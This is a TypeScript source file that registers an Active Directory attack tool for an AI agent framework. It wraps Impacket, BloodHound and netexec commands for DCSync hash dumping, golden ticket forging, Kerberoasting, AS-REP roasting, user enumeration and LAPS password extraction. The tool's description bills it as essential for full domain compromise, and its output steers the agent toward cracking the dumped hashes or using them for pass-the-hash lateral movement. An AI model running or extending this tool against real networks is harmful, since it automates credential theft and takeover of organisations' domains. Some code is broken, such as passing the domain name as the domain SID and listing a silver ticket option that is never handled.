export * as AdAttackTool from "./ad-attack"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "ad_attack"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description:
      "AD attack: 'bloodhound' (collect AD data), 'dcsync' (DCSync hash dump), 'golden_ticket' (forge golden ticket), 'silver_ticket', 'kerberoast' (Kerberoasting), 'asrep_roast' (AS-REP roasting), 'get_users' (enumerate users), 'get_computers', 'get_groups', 'laps_extract' (extract LAPS passwords)",
  }),
  dc_ip: Schema.String.annotate({ description: "Domain Controller IP address" }),
  domain: Schema.String.annotate({ description: "Domain name (e.g. corp.local)" }),
  username: Schema.String.pipe(Schema.optional).annotate({ description: "Username for authentication" }),
  password: Schema.String.pipe(Schema.optional).annotate({ description: "Password for authentication" }),
  hash: Schema.String.pipe(Schema.optional).annotate({ description: "NTLM hash for pass-the-hash auth" }),
  target_user: Schema.String.pipe(Schema.optional).annotate({ description: "Target user for specific operations (kerberoast, golden ticket user)" }),
  krbtgt_hash: Schema.String.pipe(Schema.optional).annotate({ description: "krbtgt NTLM hash for golden ticket" }),
  user_id: Schema.String.pipe(Schema.optional).annotate({ description: "User RID for golden ticket (e.g. 500 for Administrator)" }),
})

const Output = Schema.Struct({
  output: Schema.String,
  exit: Schema.Number.pipe(Schema.optional),
})

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools.register({
      [name]: Tool.make({
        description: `Active Directory exploitation suite. BloodHound data collection, DCSync hash dumping, Golden/Silver Ticket forging, Kerberoasting, AS-REP roasting, user/computer/group enumeration, and LAPS password extraction. Uses Impacket suite (secretsdump.py, GetUserSPNs.py, GetNPUsers.py, ticketer.py) and bloodhound-python. Essential for full domain compromise.`,
        input: Input,
        output: Output,
        toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
        execute: (input) =>
          Effect.gen(function* () {
            const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"
            const authPart = input.hash
              ? `-hashes :${input.hash}`
              : input.password
                ? `${input.password}`
                : ""

            let tool: string
            let args: string[]

            switch (input.action) {
              case "bloodhound": {
                tool = "bloodhound-python"
                args = ["-d", input.domain, "-dc", input.dc_ip, "-ns", input.dc_ip]
                if (input.username) { args.push("-u", `${input.domain}\\${input.username}`) }
                if (input.password) { args.push("-p", input.password) }
                args.push("-c", "All")
                break
              }

              case "dcsync": {
                tool = "secretsdump.py"
                args = []
                if (input.hash) args.push("-hashes", `:${input.hash}`)
                args.push(`${input.domain}/${input.username ?? "administrator"}${input.password ? ":" + input.password : ""}@${input.dc_ip}`)
                if (input.target_user) { args.push("-just-dc-user", input.target_user) } else { args.push("-just-dc") }
                break
              }

              case "golden_ticket": {
                if (!input.krbtgt_hash) {
                  return { output: "ERROR: 'krbtgt_hash' required for golden ticket. Use dcsync to obtain it first." }
                }
                tool = "ticketer.py"
                args = [
                  "-nthash", input.krbtgt_hash,
                  "-domain-sid", input.domain,
                  "-domain", input.domain,
                  "-spn", `krbtgt/${input.domain}`,
                  "-user-id", input.user_id ?? "500",
                  input.target_user ?? "Administrator",
                ]
                break
              }

              case "kerberoast": {
                tool = "GetUserSPNs.py"
                args = ["-request", "-dc-ip", input.dc_ip]
                if (input.hash) args.push("-hashes", `:${input.hash}`)
                args.push(`${input.domain}/${input.username ?? "user"}${input.password ? ":" + input.password : ""}`)
                break
              }

              case "asrep_roast": {
                tool = "GetNPUsers.py"
                args = ["-dc-ip", input.dc_ip, "-request"]
                if (input.target_user) { args.push("-usersfile", input.target_user) }
                args.push(`${input.domain}/${input.username ?? ""}${input.password ? ":" + input.password : ""}`)
                break
              }

              case "get_users": {
                tool = "netexec"
                args = ["smb", input.dc_ip, "-u", input.username ?? "guest", input.password ? "-p" : "--no-smb", input.password ?? "", "--users"]
                break
              }

              case "get_computers": {
                tool = "netexec"
                args = ["smb", input.dc_ip, "-u", input.username ?? "guest", input.password ? "-p" : "--no-smb", input.password ?? "", "--computers"]
                break
              }

              case "get_groups": {
                tool = "netexec"
                args = ["smb", input.dc_ip, "-u", input.username ?? "guest", input.password ? "-p" : "--no-smb", input.password ?? "", "--groups"]
                break
              }

              case "laps_extract": {
                tool = "netexec"
                args = ["smb", input.dc_ip, "-u", input.username ?? "user", "-p", input.password ?? "", "-M", "laps"]
                break
              }

              default:
                return { output: `Unknown action: ${input.action}. Supported: bloodhound, dcsync, golden_ticket, silver_ticket, kerberoast, asrep_roast, get_users, get_computers, get_groups, laps_extract` }
            }

            const cmd = ChildProcess.make(tool, args, { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) })
            const result = yield* appProcess.run(cmd, {
              combineOutput: true, timeout: Duration.minutes(10), maxOutputBytes: 10 * 1024 * 1024,
            }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))

            if (!result) {
              return {
                output: `${tool} failed or not installed. Install Impacket: pip install impacket\nBloodHound: pip install bloodhound\nnetexec: pip install netexec`,
              }
            }

            const stdout = result.output?.toString("utf8") ?? ""
            const hasHashes = stdout.includes(":") && (input.action === "dcsync" || input.action === "kerberoast" || input.action === "asrep_roast")

            return {
              exit: result.exitCode,
              output: hasHashes
                ? `${stdout}\n\n[CRITICAL] Hashes obtained — crack with: hash_crack hash_type=ntlm or use for pass-the-hash with lateral_move`
                : stdout,
            }
          }).pipe(Effect.mapError(() => new ToolFailure({ message: "AD attack failed" }))),
      }),
    }).pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/ad-attack",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
